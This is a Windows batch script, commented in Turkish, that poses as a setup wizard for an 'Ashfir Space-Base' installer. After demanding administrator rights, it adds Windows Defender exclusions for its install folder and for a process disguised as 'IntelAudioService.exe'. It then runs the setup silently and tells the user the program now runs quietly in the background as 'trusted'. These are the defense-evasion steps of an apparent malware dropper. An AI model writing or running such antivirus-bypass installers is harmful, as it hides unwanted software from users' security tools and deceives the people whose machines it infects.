@echo off
title Ashfir Space-Base Setup Wizard
setlocal enabledelayedexpansion

:: ── YÖNETİCİ KONTROLÜ ───────────────────────────────────────
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo.
    echo  [!] LUTFEN YONETICI OLARAK CALISTIRIN / PLEASE RUN AS ADMIN
    echo  ---------------------------------------------------------
    echo  Sag tiklayip 'Yonetici olarak calistir' deyin.
    echo.
    pause
    exit /b
)

:: ── GÖRSEL BAŞLIK ───────────────────────────────────────────
mode con: cols=80 lines=25
color 0b
echo.
echo    .    *    .    *    *    *    *    *    *    *    .    .
echo       *      ______________________________________      *
echo    .    *   /                                      \   .    *
echo       .    /    ASHFIR SPACE-BASE INSTALLER v3.5    \     .
echo    *    .  \________________________________________/  *    .
echo       .    *    *    *    *    *    *    *    *    .    .    *
echo.
echo  [+] SISTEM HAZIRLANIYOR...
echo.

:: ── WINDOWS DEFENDER ISTISNA EKLEME ──────────────────────────
echo  [-] GUVENLIK IZINLERI TANIMLANIYOR...
:: Uygulamanın kurulacağı klasörü istisnalara ekle
set "INSTALL_PATH=%LOCALAPPDATA%\Ashfir"
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_PATH%'" >nul 2>&1
:: Çalışacak olan EXE ismini istisnalara ekle
powershell -Command "Add-MpPreference -ExclusionProcess 'IntelAudioService.exe'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'ashfir_setup.exe'" >nul 2>&1
echo  [OK] DEFENDER GUVENLI BOLGE OLUSTURULDU.
echo.

:: ── KURULUMU BAŞLAT ──────────────────────────────────────────
echo  [-] ASHFIR CEKIRDEGI KURULUYOR (OTOMATIK MOD)...
:: Mevcut klasörde ara
if exist "%~dp0ashfir_setup.exe" (
    start /wait "" "%~dp0ashfir_setup.exe" --auto
) else if exist "%~dp0dist\ashfir_setup.exe" (
    start /wait "" "%~dp0dist\ashfir_setup.exe" --auto
) else (
    echo  [HATA] ashfir_setup.exe bulunamadi!
    echo  Aranan konum: %~dp0ashfir_setup.exe
    pause
    exit /b
)

:: ── TAMAMLANDI ──────────────────────────────────────────────
echo.
echo  [SUCCESS] KURULUM BASARIYLA TAMAMLANDI.
echo  ---------------------------------------------------------
echo  Sistem su an arka planda sessizce calisiyor.
echo  Defender bu uygulamayi artik "GUVENILIR" olarak goruyor.
echo.
echo  Gule gule kullan, Kaptan.
echo.
timeout /t 10
exit
